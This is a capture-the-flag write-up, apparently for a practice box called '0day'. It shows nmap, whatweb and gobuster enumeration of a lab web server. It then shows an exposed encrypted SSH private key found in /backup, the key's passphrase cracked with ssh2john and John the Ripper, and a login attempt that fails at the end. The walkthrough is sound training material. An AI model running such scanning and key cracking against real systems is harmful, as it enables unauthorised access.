<img width="680" height="340" alt="turtle" src="https://github.com/user-attachments/assets/addabb14-fc6a-426e-ac50-521699c514a2" />



I started by running an Nmap scan to see what services were exposed on the target machine. This helps understand the attack surface before diving deeper.

First, I ran a standard scan with default scripts and version detection:

```bash
mrbunny $ sudo nmap -sS -p- 10.80.160.139 -oN port-scan.txt -T5
[sudo] password for greatkey: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-04 21:49 EST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.46% done
Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 56.47% done; ETC: 21:50 (0:00:32 remaining)
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.39% done; ETC: 21:50 (0:00:28 remaining)
Nmap scan report for 10.80.160.139
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 55.52 second
```



The scan revealed only two open ports:

22/tcp – SSH

80/tcp – HTTP

Since SSH typically requires valid credentials, I decided to focus on the web service running on port 80, as web applications often provide an initial entry point.

<img width="1920" height="1080" alt="Screenshot at 2026-01-04 22-00-21" src="https://github.com/user-attachments/assets/47b56902-5133-4a87-808b-2ff06308f83a" />
```

i also try to find what web-stack is used here so i try whatweb and wig for more information:
```
mrbunny $ whatweb http://10.80.160.139/
http://10.80.160.139/ [200 OK] Apache[2.4.7], Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.80.160.139], JQuery, Meta-Author[name], Script, Title[0day]

```

```
mrbunny $ wig http://10.80.160.139/

wig - WebApp Information Gatherer


Scanning http://10.80.160.139/...
_________________ SITE INFO __________________
IP              Title                         
10.80.160.139   0day                        
                                              
__________________ VERSION ___________________
Name            Versions   Type               
Apache          2.4.7      Platform           
Ubuntu          14.04      OS                 
                                              
______________________________________________
Time: 30.5 sec  Urls: 810  Fingerprints: 39241
```

i try common hints endpoint robosts.txt


http://10.80.160.139/robots.txt
'''You really thought it'd be this easy?
'''
```
i try other path like login,and also admin but amdin return blank page 
### Directory Brute Forcing

After identifying a web service running on port 80, I performed directory brute forcing to discover hidden directories and files that were not directly accessible from the main page.

I used **Gobuster** with a common directory wordlist:

```bash
mrbunny $ gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt dir -u http://10.80.160.139/ -o directory-disctory.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.160.139/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin              (Status: 301) [Size: 315] [--> http://10.80.160.139/cgi-bin/]
/img                  (Status: 301) [Size: 311] [--> http://10.80.160.139/img/]
/uploads              (Status: 301) [Size: 315] [--> http://10.80.160.139/uploads/]
/admin                (Status: 301) [Size: 313] [--> http://10.80.160.139/admin/]
/css                  (Status: 301) [Size: 311] [--> http://10.80.160.139/css/]
/js                   (Status: 301) [Size: 310] [--> http://10.80.160.139/js/]
/backup               (Status: 301) [Size: 314] [--> http://10.80.160.139/backup/]
/secret               (Status: 301) [Size: 314] [--> http://10.80.160.139/secret/]
```
i found some intresting directory i try go watch what intresting i can here found
![forb at 2026-01-04 22-41-44-crop](https://github.com/user-attachments/assets/e750ab83-3399-492c-ac32-c05b624b6593)

![arc](https://github.com/user-attachments/assets/0963cf0c-0fb6-4a8f-aeeb-faeb3a21e3ca)

![Screenshot at 2026-01-04 22-49-01](https://github.com/user-attachments/assets/2e2e8d0a-ecb5-44dc-b919-497fa058bd80)
now again it's return blank page,so i now go for others

![Screenshot at 2026-01-04 23-01-54](https://github.com/user-attachments/assets/56e791eb-2aa7-4337-9817-644f2411b79b)


While continuing directory enumeration, I discovered a `/backup` directory. Inside this directory, I found an SSH private key encoded.



![Screenshot at 2026-01-04 22-55-55](https://github.com/user-attachments/assets/fb424ab8-cf07-4a82-81c3-c2a1b5f820e0)


The key was encrypted, meaning a passphrase was required to use it. At this stage, the main challenge was identifying the correct username associated with the key and cracking the passphrase.
so save it and crack it
i used ssh2john to conver in hash so john can understand it for cracking
and then i simple use john and i get id_rsa:letmein(passphrase key)
```bash
mrbunny $ nano id_rsa
mrbunny $ ls
cache  directory-disctory.txt  id_rsa  port-scan.txt
mrbunny $ file id_rsa
id_rsa: PEM RSA private key
mrbunny $ ssh2john id_rsa > id_rsa.hash
mrbunny $ ls
cache  directory-disctory.txt  id_rsa  id_rsa.hash  port-scan.txt
mrbunny $ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)     
1g 0:00:00:00 DONE (2026-01-04 23:15) 14.28g/s 7314p/s 7314c/s 7314C/s teiubesc..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
mrbunny $ john --show id_rsa.hash
id_rsa:letmein

1 password hash cracked, 0 left
mrbunny $

```
now we can try to login normaly
```bash
mrbunny $ ls -l id_rsa
-rw-r--r-- 1 greatkey greatkey 1766 Jan  4 23:14 id_rsa
mrbunny $ chmod 400 id_rsa
mrbunny $ ls -l id_rsa
-r-------- 1 greatkey greatkey 1766 Jan  4 23:14 id_rsa
mrbunny $ ssh -i id_rsa turtle@10.80.160.139 
The authenticity of host '10.80.160.139 (10.80.160.139)' can't be established.
ED25519 key fingerprint is SHA256:RagPojtI1X12KWTyYetHjXVozjQqsxNmneOUKEjxwU0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.80.160.139' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
sign_and_send_pubkey: no mutual signature supported
turtle@10.80.160.139's password: 
Permission denied, please try again.
turtle@10.80.160.139's password: 
Permission denied, please try again.
turtle@10.80.160.139's password: 
turtle@10.80.160.139: Permission denied (publickey,password).
```








